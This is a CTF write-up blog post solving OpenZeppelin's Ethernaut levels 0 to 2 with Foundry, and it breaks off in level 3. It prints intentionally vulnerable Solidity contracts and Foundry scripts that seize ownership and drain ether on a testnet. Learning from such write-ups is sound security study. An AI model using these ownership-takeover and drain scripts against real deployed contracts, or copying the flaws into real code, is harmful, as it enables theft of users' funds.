<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Mj0ln1r-Ethernaut CTF (Blockchain)</title>
  <link rel="icon" type="image/x-icon" href="assets/img/favicons/favicon.ico">
  <link rel="stylesheet" href="/css/main.css">
  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>

  <!-- <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Ethernaut CTF (Blockchain) | Mj0ln1’s Blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Ethernaut CTF (Blockchain)" />
<meta name="author" content="Mj0ln1" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Hello internet, I am learning web3 security by doing blockchain CTF challenges. To get to know more common vulnerabilities and put my learning knowledge from secureum bootcamp in practice I have solved ethernaut CTF challenges powered by OpenZeppelin. I have solved all these challenges by using foundry to get my hands dirty with foundry. I recommend to go through the ethereum101, solidity 101 and solidity 201 modules of the secureum bootcamp before taking up these challenges." />
<meta property="og:description" content="Hello internet, I am learning web3 security by doing blockchain CTF challenges. To get to know more common vulnerabilities and put my learning knowledge from secureum bootcamp in practice I have solved ethernaut CTF challenges powered by OpenZeppelin. I have solved all these challenges by using foundry to get my hands dirty with foundry. I recommend to go through the ethereum101, solidity 101 and solidity 201 modules of the secureum bootcamp before taking up these challenges." />
<link rel="canonical" href="http://localhost:4000/posts/ethernaut" />
<meta property="og:url" content="http://localhost:4000/posts/ethernaut" />
<meta property="og:site_name" content="Mj0ln1’s Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-12-09T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Ethernaut CTF (Blockchain)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mj0ln1","url":"https://themj0ln1r.github.io"},"dateModified":"2023-12-09T00:00:00+05:30","datePublished":"2023-12-09T00:00:00+05:30","description":"Hello internet, I am learning web3 security by doing blockchain CTF challenges. To get to know more common vulnerabilities and put my learning knowledge from secureum bootcamp in practice I have solved ethernaut CTF challenges powered by OpenZeppelin. I have solved all these challenges by using foundry to get my hands dirty with foundry. I recommend to go through the ethereum101, solidity 101 and solidity 201 modules of the secureum bootcamp before taking up these challenges.","headline":"Ethernaut CTF (Blockchain)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/ethernaut"},"url":"http://localhost:4000/posts/ethernaut"}</script>
<!-- End Jekyll SEO tag -->
 
</head>

<body>
  <div id="wrapper">
    <header>
  <div class="head-parent">
      <a href="/">
        <h1>mj0ln1r@home:~$</h1></a>
        <span id="command">cat ethernaut</span>
    <div class="header-links">
      <a href="/archive"><h2 class="header-link">Archive</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>

    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>Ethernaut CTF (Blockchain)</h2>
  <time datetime="2023-12-09T00:00:00+05:30" class="by-line">09 Dec 2023</time>
  <p>Hello internet, I am learning web3 security by doing blockchain CTF challenges. To get to know more common vulnerabilities and put my learning knowledge from secureum bootcamp in practice I have solved <a href="https://ethernaut.openzeppelin.com/" target="_blank">ethernaut</a> CTF challenges powered by OpenZeppelin. I have solved all these challenges by using foundry to get my hands dirty with foundry. I recommend to go through the ethereum101, solidity 101 and solidity 201 modules of the secureum bootcamp before taking up these challenges.</p>

<p>This repository can be useful as a template for the people who want’s to solve ethernaut by using foundry. I will try my best to explain the solutions to challenges.</p>

<blockquote>
  <p>Solution Repo : <a href="https://github.com/TheMj0ln1r/ethernaut-foundry" target="_blank">https://github.com/TheMj0ln1r/ethernaut-foundry</a></p>
</blockquote>

<p>Setup the codebase locally :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/TheMj0ln1r/ethernaut-foundry.git
<span class="nv">$ </span><span class="nb">cd </span>ethernaut-foundry
</code></pre></div></div>

<p>The challenge contracts are in <code class="language-plaintext highlighter-rouge">/src</code></p>

<p>Solution scripts under <code class="language-plaintext highlighter-rouge">/script</code></p>

<p>You need to add a <code class="language-plaintext highlighter-rouge">.env</code> file and fill following required fieds.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RPC_URL=
MY_ADDRESS=
PRIVATE_KEY=
</code></pre></div></div>

<p>Get some Sepolia Eth to your address. (I am using Sepolia Testnet to solve)</p>

<h1 id="0-hello-ethernaut">0 Hello Ethernaut</h1>

<p>This is a sanity check challenge to the ethernaut. The source code was given to us. We have to deploy the instance and call the <code class="language-plaintext highlighter-rouge">info()</code> method on it and follow the instructions to solve the challenge.</p>

<p><code class="language-plaintext highlighter-rouge">level0.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Instance</span> <span class="p">{</span>

  <span class="nx">string</span> <span class="kr">public</span> <span class="nx">password</span><span class="p">;</span>
  <span class="nx">uint8</span> <span class="kr">public</span> <span class="nx">infoNum</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
  <span class="nx">string</span> <span class="kr">public</span> <span class="nx">theMethodName</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">The method name is method7123949.</span><span class="dl">'</span><span class="p">;</span>
  <span class="nx">bool</span> <span class="kr">private</span> <span class="nx">cleared</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

  <span class="c1">// constructor</span>
  <span class="nf">constructor</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">password</span> <span class="o">=</span> <span class="nx">_password</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">info</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="dl">'</span><span class="s1">You will find what you need in info1().</span><span class="dl">'</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">info1</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="dl">'</span><span class="s1">Try info2(), but with "hello" as a parameter.</span><span class="dl">'</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">info2</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">param</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">if</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nx">param</span><span class="p">))</span> <span class="o">==</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">)))</span> <span class="p">{</span>
      <span class="k">return</span> <span class="dl">'</span><span class="s1">The property infoNum holds the number of the next info method to call.</span><span class="dl">'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="dl">'</span><span class="s1">Wrong parameter.</span><span class="dl">'</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">info42</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="dl">'</span><span class="s1">theMethodName is the name of the next method.</span><span class="dl">'</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">method7123949</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">pure</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="dl">'</span><span class="s1">If you know the password, submit it to authenticate().</span><span class="dl">'</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">authenticate</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">passkey</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">if</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nx">passkey</span><span class="p">))</span> <span class="o">==</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nx">password</span><span class="p">)))</span> <span class="p">{</span>
      <span class="nx">cleared</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">getCleared</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">cleared</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">level0Solve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Instance</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">src/level0.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Level0Solve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Instance</span> <span class="kr">public</span> <span class="nx">Level0</span> <span class="o">=</span> <span class="nc">Instance</span><span class="p">(</span><span class="mh">0xc770F44bFDAe8eD857FaBeaFF5A702B87eAeC331</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">Level0</span><span class="p">.</span><span class="nf">password</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Password : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">password</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">Level0</span><span class="p">.</span><span class="nf">authenticate</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/level0Solve.s.sol:Level0Solve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="1-fallback">1 Fallback</h1>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Fallback</span> <span class="p">{</span>

  <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">contributions</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">ether</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span>
            <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">caller is not the owner</span><span class="dl">"</span>
        <span class="p">);</span>
        <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">contribute</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&lt;</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>
    <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
    <span class="nf">if</span><span class="p">(</span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">owner</span><span class="p">])</span> <span class="p">{</span>
      <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">getContribution</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nf">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nf">transfer</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="nf">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal :</li>
</ul>

<ol>
  <li>Our goal is to become the owner of the contract and drain all the ether of it</li>
</ol>

<ul>
  <li>Solution :</li>
</ul>

<ol>
  <li>Fallback contract sets the owner variable in <code class="language-plaintext highlighter-rouge">receive()</code> function.</li>
  <li>To set the owner we need to pass the require check in <code class="language-plaintext highlighter-rouge">receive()</code></li>
  <li>To pass the check we have to send some ether with the <code class="language-plaintext highlighter-rouge">TX</code> and our sender should have some contributions in it.</li>
  <li>So, Initially we will send contributions and then send some ether to the contract to invoke the <code class="language-plaintext highlighter-rouge">receive()</code> method.</li>
  <li>After we sent the new owner as ourselves, we can call <code class="language-plaintext highlighter-rouge">withdraw()</code> function to drain the contract.</li>
</ol>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Fallback</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">src/Fallback.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Level0Solve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Fallback</span> <span class="kr">public</span> <span class="nx">level1</span> <span class="o">=</span> <span class="nc">Fallback</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0x67B71283A3a53C445f33Ea0a0F8E435cD1f283E1</span><span class="p">));</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Original Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">level1</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>        
        
        <span class="nx">level1</span><span class="p">.</span><span class="nx">contribute</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.0001</span> <span class="nx">ether</span><span class="p">}();</span>
        <span class="nf">address</span><span class="p">(</span><span class="nx">level1</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">wei</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">New Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">level1</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Initial Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">level1</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
        <span class="nx">level1</span><span class="p">.</span><span class="nf">withdraw</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Final Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">level1</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/FallbackSolve.s.sol:FallbackSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="2-fallout">2 Fallout</h1>

<p><code class="language-plaintext highlighter-rouge">Fallout.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">'</span><span class="s1">@openzeppelin-contracts-06/contracts/math/SafeMath.sol</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Fallout</span> <span class="p">{</span>
  
  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="nf">mapping </span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">allocations</span><span class="p">;</span>
  <span class="nx">address</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>


  <span class="cm">/* constructor */</span>
  <span class="kd">function</span> <span class="nf">Fal1out</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">allocations</span><span class="p">[</span><span class="nx">owner</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
	        <span class="nf">require</span><span class="p">(</span>
	            <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span>
	            <span class="dl">"</span><span class="s2">caller is not the owner</span><span class="dl">"</span>
	        <span class="p">);</span>
	        <span class="nx">_</span><span class="p">;</span>
	    <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">allocate</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">].</span><span class="nf">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">sendAllocation</span><span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span> <span class="nx">allocator</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">allocator</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">collectAllocations</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">allocatorBalance</span><span class="p">(</span><span class="nx">address</span> <span class="nx">allocator</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal :</li>
</ul>

<ol>
  <li>Claim the ownership of the contract</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>In solidity <code class="language-plaintext highlighter-rouge">0.6.0</code> the constructor of the contract is the name of the contract, later it was replaced with <code class="language-plaintext highlighter-rouge">constructor</code> keyword.</li>
  <li>Here in this contract the constructor sets up the <code class="language-plaintext highlighter-rouge">owner</code>.</li>
  <li>But the function <code class="language-plaintext highlighter-rouge">Fal1out()</code> is not actually a constructor, because its not same as the contract name.</li>
  <li>So, we can call this function and claim the ownership.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">FalloutSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Fallout</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Fallout.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">FalloutSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Fallout</span> <span class="kr">public</span> <span class="nx">level2</span> <span class="o">=</span> <span class="nc">Fallout</span><span class="p">(</span><span class="mh">0xf66ffe7e1e2663E19fec83F39256cc3Af3513000</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Original Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">level2</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">level2</span><span class="p">.</span><span class="nc">Fal1out</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">New Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">level2</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">level2</span><span class="p">.</span><span class="nf">collectAllocations</span><span class="p">();</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/FalloutSolve.s.sol:FalloutSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="3-coin-flip">3 Coin Flip</h1>

<p><code class="language-plaintext highlighter-rouge">CoinFlip.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">CoinFlip</span> <span class="p">{</span>

  <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">consecutiveWins</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="nx">lastHash</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="nx">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">flip</span><span class="p">(</span><span class="nx">bool</span> <span class="nx">_guess</span><span class="p">)</span> <span class="kr">public</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
